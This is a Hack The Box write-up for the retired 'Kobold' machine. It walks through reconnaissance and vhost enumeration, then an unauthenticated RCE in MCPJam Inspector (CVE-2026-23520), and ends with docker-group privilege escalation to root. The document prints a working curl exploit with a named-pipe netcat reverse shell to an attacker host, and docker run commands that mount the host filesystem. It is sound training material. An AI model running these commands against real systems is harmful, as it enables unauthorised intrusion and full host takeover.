# HTB Kobold — Walkthrough

## Machine Info

| Field | Detail |
|-------|--------|
| Platform | Hack The Box |
| Machine | Kobold |
| Difficulty | Easy |
| OS | Linux (Ubuntu) |
| IP | 10.129.X.X |
| Status | Retired |
| CVEs exploited | CVE-2026-23520 (MCPJam Inspector unauthenticated RCE) |

---

## Summary

Kobold is a five-step chain that starts with TLS certificate reconnaissance and ends with a docker-group container escape. The wildcard SAN on the certificate signals virtual hosts; enumeration reveals an MCPJam Inspector instance on a subdomain that is vulnerable to an unauthenticated RCE via its `/api/mcp/connect` endpoint. The foothold lands in a container as the `ben` user, whose docker group membership is exploitable via `sg docker` to launch a privileged container with the host filesystem mounted, yielding root access without needing a CVE.

---

## Step 1: Reconnaissance

**Objective:** identify open services and enumerate the external attack surface.

```bash
export IP=10.129.X.X
nmap -sV -sC -p- $IP -oN HTB_Kobold_Initial_Scan
```

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu |
| 80/tcp | HTTP | nginx 1.24.0 (redirects to HTTPS) |
| 443/tcp | HTTPS | nginx 1.24.0 |
| 3552/tcp | HTTP | Golang net/http server |

**What this told me:**
- Four ports, and two things stood out. Port 3552 was unusual: a Golang HTTP service on a non-standard port, and the `_http-title` reported "Site doesn't have a title," which meant the service was probably an API rather than a rendered web application. The HTTPS on 443 carried a wildcard SAN (`DNS:kobold.htb, DNS:*.kobold.htb`), which is the standard signal to enumerate virtual hosts.

**Screenshot:** Figure 1

![](/HTB/Kobold/images/02-Nmap_Initial_Scan.png)

---

## Step 2: TLS Certificate Inspection

**Objective:** confirm the SAN and identify any additional hostnames.

```bash
openssl s_client -connect kobold.htb:443 </dev/null 2>/dev/null | openssl x509 -noout -text | grep -A2 "Subject Alternative"
```

Response:

```
X509v3 Subject Alternative Name:
    DNS:kobold.htb, DNS:*.kobold.htb
```

**What this told me:**
- The wildcard SAN confirmed the operator was expecting multiple subdomains to exist. That is a certificate configured for a virtual-host setup, so the next step was to enumerate what those subdomains might be. This is the same pattern I would later see on Fireflow: read the certificate first, then enumerate the vhosts it implies.

---

## Step 3: Virtual Host Enumeration

**Objective:** discover the vhosts hinted at by the wildcard certificate.

```bash
ffuf -u https://kobold.htb/ -H "Host: FUZZ.kobold.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -mc 200 -k
```

Result: `mcp` returned Status 200, Size 466.

Added `mcp.kobold.htb` to `/etc/hosts`.

**What this told me:**
- The `mcp` subdomain resolved to something different from the main site. Browsing to it revealed the MCPJam Inspector, a testing interface for MCP (Model Context Protocol) servers. This was the interesting attack surface: an internal-looking tool exposed on a subdomain, likely with weaker security than the main application.

**Screenshot:** Figures 2 and 3

![](/HTB/Kobold/images/05-ffuf_Scan.png)

![](/HTB/Kobold/images/06-MCPJam.png)

---

## Step 4: Identifying the Vulnerability

**Objective:** understand what the MCPJam Inspector exposes and search for known vulnerabilities.

MCPJam Inspector's `/api/mcp/connect` endpoint is designed to launch MCP server processes from a client-supplied command. Version fingerprinting on `mc.kobold.htb` matched MCPJam Inspector affected by CVE-2026-23520: the endpoint accepts a `serverConfig` object with a `command` field and passes it to `child_process.spawn()` with no authentication and no input sanitisation.

The main site at `kobold.htb` also disclosed a contact address `admin@kobold.htb` in its footer, and the Arcane container-management platform on port 3552 (v1.13.0) exposed its full OpenAPI specification without authentication at `/api/openapi.json`.

**What this told me:**
- Three attack surfaces, but only one that mattered immediately. The MCPJam RCE was the direct route to a shell; the Arcane OpenAPI exposure was reconnaissance material for later; the admin email was noted for potential phishing scenarios in a real engagement. On a CTF, the RCE was the clear path forward.

---

## Step 5: Foothold via Unauthenticated RCE

**Objective:** exploit CVE-2026-23520 to land a reverse shell.

The endpoint accepts a JSON body specifying the command to spawn. A proof-of-concept `id` confirmed command execution. Then a named-pipe reverse-shell payload was constructed against a listener:

```bash
# Listener:
nc -lvnp 443

# Exploit:
curl -sk https://mcp.kobold.htb/api/mcp/connect \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"bash","args":["-c","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [ATTACKER_IP] 443 >/tmp/f"],"env":{}},"serverId":"shell"}'
```

Callback:

```
connect to [ATTACKER_IP] from (UNKNOWN) [10.129.X.X] 34274
sh: 0: can't access tty; job control turned off
$ whoami
ben
```

Shell as `ben` inside a container. TTY upgraded via Python's pty module:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**What this told me:**
- The reverse shell landed as `ben`, not root. The working directory was `/usr/local/lib/node_modules/@mcpjam/inspector`, confirming this was inside a Node.js container. The user flag was in `ben`'s home directory. The next step was to work out how to escalate from `ben` to root.

**Screenshot:** Figure 4

![](/HTB/Kobold/images/07-CVE_2026_23520.png)

---

## Step 6: Post-Foothold Enumeration

**Objective:** identify a path from `ben` to root.

Standard Linux enumeration:

```bash
whoami
# ben

id
# uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)

sudo -l
# ben is not in the sudoers file
```

No sudo access. But the `id` output showed `ben` was a member of the `operator` group. Continuing the enumeration:

```bash
groups ben
# ben : ben operator
```

The operator group was interesting, but not obviously exploitable on its own. However, testing `sg` (switch group) revealed the actual escalation path:

```bash
sg docker -c "docker images"
```

This returned a list of local Docker images. `ben` had access to docker-group functionality via `sg`, even though `docker` did not appear in the `id` output directly. That is a common misconfiguration: users are added to secondary groups they can activate on demand.

**What this told me:**
- Docker group membership is functionally equivalent to root, because any docker-group member can launch a privileged container with the host filesystem mounted, bypassing all file permissions. This is a well-known GTFOBins entry, and it applied directly here. `sg docker` was the key: it activated the group membership needed to exec docker commands.

---

## Step 7: Root via Docker Container Escape

**Objective:** exploit docker-group access to obtain root on the host.

The strategy: launch a container running as root with the host root filesystem bind-mounted inside it, then execute `whoami` inside the container. Because the container runs as root and has the host filesystem, `whoami` returns `root` and any command inside the container acts on the host.

```bash
sg docker -c "docker run -u root -v /:/hostfs --rm --entrypoint whoami privatebin/nginx-fpm-alpine:2.0.2"
# root
```

The `-v /:/hostfs` flag mounts the host's root filesystem at `/hostfs` inside the container. Because the container runs as root, it can read and write anything on the host.

Reading the root flag:

```bash
sg docker -c "docker run -u root -v /:/hostfs --rm --entrypoint cat privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txt"
```

**What this told me:**
- This is why docker-group membership is treated as root-equivalent in every hardening guide. The container is a shell on the host, disguised as an isolated workload. The escape does not require exploiting docker itself: it uses docker exactly as designed. The problem is the permission model, not the software.

**Screenshot:** Figure 5

![](/HTB/Kobold/images/08-User_To_Root.png)

---

## Flags

| Flag | Method | Status |
|------|--------|--------|
| User | Reverse shell as `ben` via CVE-2026-23520 (MCPJam RCE) | [REDACTED] |
| Root | Docker group abuse via `sg docker` (host filesystem mount) | [REDACTED] |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service enumeration |
| openssl | TLS certificate inspection |
| ffuf | Virtual host enumeration |
| curl | HTTP and API interaction |
| netcat (nc) | Reverse shell listener |
| python3 | TTY upgrade via pty |
| docker / sg | Privilege escalation |

---

## Lessons Learned

1. **TLS certificate reading is worth doing before any vhost enumeration.** The wildcard SAN was the signal that told me virtual hosts existed. Without checking the certificate, I might have run ffuf against every possible vhost list in seclists. With it, I knew to look for something on `*.kobold.htb` specifically, which narrowed the enumeration and gave me `mcp` on the first realistic wordlist.
2. **Docker group membership is root, not "advanced user."** This finding class is worth internalising because it appears everywhere. Any time a user's `id` output includes `docker`, or `sg docker` succeeds, the box is already lost. The escape is not a CVE and cannot be patched; it can only be prevented by not granting docker-group membership.
3. **`sg` reveals group memberships that `id` might not surface immediately.** The `operator` group in `ben`'s primary groups was a hint, but testing `sg docker` explicitly was what confirmed the path. When enumerating users, always test whether they can activate additional groups via `sg`, not just the ones shown in `id`.

---

## References

| Resource | URL |
|----------|-----|
| CVE-2026-23520 (MCPJam Inspector) | https://nvd.nist.gov/vuln/detail/CVE-2026-23520 |
| GTFOBins (docker) | https://gtfobins.github.io/gtfobins/docker/ |
| Docker security documentation | https://docs.docker.com/engine/security/ |
| OWASP A01:2021 (Broken Access Control) | https://owasp.org/Top10/A01_2021-Broken_Access_Control/ |

---

*This walkthrough documents a retired Hack The Box machine completed in an authorised lab environment for educational purposes. Flags are redacted. No unauthorised systems were accessed.*
